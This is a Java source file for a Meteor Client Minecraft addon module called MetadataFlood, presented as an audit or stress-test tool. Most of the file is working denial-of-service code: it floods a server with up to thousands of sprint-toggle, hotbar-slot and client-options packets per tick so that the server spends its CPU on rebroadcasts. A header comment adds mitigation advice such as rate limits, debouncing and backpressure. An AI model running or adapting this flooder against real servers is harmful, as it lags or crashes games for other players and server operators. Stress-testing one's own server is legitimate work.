package com.example.addon.modules.testing;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.common.ClientOptionsC2SPacket;
import net.minecraft.network.packet.c2s.common.SyncedClientOptions;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;

/**
 * AUDIT: Metadata Flood (legal high-frequency CPU abuse)
 *
 * Spams packets that are individually legal and cheap to SEND but force
 * expensive server-side work to PROCESS - the real CPU-theft vector. None of
 * these are malformed; the abuse is purely frequency + per-packet cost.
 *
 *   SPRINT_TOGGLE   alternate START/STOP_SPRINTING. Each toggle flips an entity
 *                   metadata flag the server must recompute and REBROADCAST to
 *                   every player tracking you - O(viewers) CPU per packet. The
 *                   canonical "one player steals the server's CPU" vector.
 *   HELD_SLOT       cycle the selected hotbar slot. Forces held-item updates and
 *                   equipment-change broadcasts to trackers.
 *   CLIENT_SETTINGS resend ClientOptions repeatedly. Forces the server to
 *                   re-process and re-sync player options each time.
 *   MIXED           rotate through all of the above.
 *
 * Pair with server-probe (watch CPU-driven TPS dip + out/s) and lag-profiler
 * (find the exact rate that breaks it). Run against your OWN local server.
 *
 * Patch signal: rate-limit these per-packet-type server-side; debounce metadata
 * recomputation (coalesce rapid sprint/slot toggles into one broadcast per
 * tick); apply Netty backpressure (stop reading) when a player's inbound rate
 * exceeds budget, rather than processing every packet on the main thread.
 */
public class MetadataFlood extends Module {
    public enum Mode { SPRINT_TOGGLE, HELD_SLOT, CLIENT_SETTINGS, MIXED }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.SPRINT_TOGGLE).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("How many metadata packets to send each tick.")
        .defaultValue(100).range(1, 5000).sliderRange(1, 1000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private boolean sprintState = false;
    private int slot = 0;
    private int rotate = 0;

    public MetadataFlood() {
        super(AddonTemplate.TESTING_CATEGORY, "metadata-flood",
            "Floods legal metadata packets (sprint/slot/options) that are cheap to send but costly to broadcast. Tests CPU exhaustion + backpressure.");
    }

    @Override
    public void onActivate() { sprintState = false; slot = 0; rotate = 0; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        for (int i = 0; i < perTick.get(); i++) {
            Mode m = mode.get() == Mode.MIXED ? Mode.values()[rotate++ % 3] : mode.get();
            sendOne(m);
        }
    }

    private void sendOne(Mode m) {
        switch (m) {
            case SPRINT_TOGGLE -> {
                sprintState = !sprintState;
                mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(mc.player,
                    sprintState ? ClientCommandC2SPacket.Mode.START_SPRINTING
                                : ClientCommandC2SPacket.Mode.STOP_SPRINTING));
            }
            case HELD_SLOT -> {
                slot = (slot + 1) % 9;
                mc.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(slot));
            }
            case CLIENT_SETTINGS -> mc.player.networkHandler.sendPacket(
                new ClientOptionsC2SPacket(SyncedClientOptions.createDefault()));
            case MIXED -> {}
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
